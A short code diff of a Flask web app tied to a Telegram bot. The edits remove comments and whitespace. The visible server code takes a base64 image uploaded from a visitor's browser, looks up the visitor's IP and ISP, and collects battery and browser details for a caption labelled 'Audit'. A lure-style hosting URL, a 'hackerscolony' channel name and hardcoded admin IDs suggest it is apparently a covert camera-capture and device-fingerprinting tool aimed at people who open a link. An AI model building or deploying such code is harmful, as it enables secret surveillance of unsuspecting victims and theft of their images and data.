@@ -4,7 +4,6 @@ from telebot import types
 
 app = Flask(__name__)
 
-# Config
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMINS = [518067190, 7162565886]
 TG_CHANNEL = "hackerscolonytech"
@@ -13,7 +12,6 @@ RENDER_LINK = "https://happy-wishing-you.onrender.com"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Process Cleanup
 def handler(signum, frame):
     os._exit(0)
 signal.signal(signal.SIGTERM, handler)
@@ -81,9 +79,7 @@ def upload():
         ip_info = requests.get(f"http://ip-api.com/json/{request.remote_addr}").json()
         isp = ip_info.get('isp', 'Unknown')
     except: pass
-    
     img_data = base64.b64decode(data.get('image').split(',')[1])
-    # Restored CPU and Network Info
     caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
                f"🔋 <b>Battery:</b> {info.get('battery')}\n"
                f"🌐 <b>Browser:</b> {info.get('browser')}\n"
@@ -99,4 +95,4 @@ if __name__ == "__main__":
     threading.Thread(target=lambda: bot.polling(none_stop=True), daemon=True).start()
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
-    
+                               
